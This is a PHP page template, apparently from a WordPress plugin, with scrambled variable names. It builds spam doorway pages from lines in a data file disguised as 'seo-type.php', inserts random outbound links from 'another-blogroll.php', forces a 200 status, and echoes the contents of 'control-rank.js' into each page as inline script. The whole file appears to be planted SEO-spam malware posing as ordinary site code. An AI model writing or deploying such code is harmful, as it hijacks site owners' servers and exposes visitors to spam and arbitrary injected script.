<?php
$sPmpPPzevy = intval(get_query_var('nehpypztei'));

if ($sPmpPPzevy < 1 || $sPmpPPzevy > 3333) return;
$dqVrF = file(plugin_dir_path(__FILE__).'seo-type.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$eLYsgZO = explode(';', $dqVrF[$sPmpPPzevy]);
if (count($eLYsgZO) < 2) return;
$bzjuE2WRE = $eLYsgZO[0];
$rqzyhP0ba  = $eLYsgZO[1];
$gzKN3WIL = $eLYsgZO[2];
$qUso56  = $eLYsgZO[3];
$w4akU = $eLYsgZO[4];
set_query_var('mgobhbxsue', $bzjuE2WRE);

$jz805qmR = '';
$enLm6tqBpH = plugin_dir_path(__FILE__).'another-blogroll.php';
if (is_file($enLm6tqBpH)) {
	$fWLk2Re = file($enLm6tqBpH, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($fWLk2Re);
	shuffle($fWLk2Re);
	$i1KfF3Ke = mt_rand(2, 5);
	if (count($fWLk2Re) > $i1KfF3Ke) {
		for ($ebkkRt = 0; $ebkkRt < $i1KfF3Ke; $ebkkRt++) {
			$fTKzpKuo = array_shift($fWLk2Re);
			$jz805qmR .= '<p><a href="'.$fTKzpKuo.'">'.$fTKzpKuo.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $bzjuE2WRE; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $rqzyhP0ba . "</p>\n";
				if (strlen($qUso56) > 0) echo "<p>" . $qUso56 . "</p>\n";
				if (strlen($gzKN3WIL) > 0) echo "<p>" . $gzKN3WIL . "</p>\n";
				if (strlen($w4akU) > 0) echo '<p><a href="#"><img src="'.$w4akU.'"></a>' . "</p>\n";
				echo $jz805qmR;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$q3CJG5bZu = plugin_dir_path(__FILE__) . 'control-rank.js';
if (is_file($q3CJG5bZu)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($q3CJG5bZu);
	echo '</script>';
}
get_footer();
?>
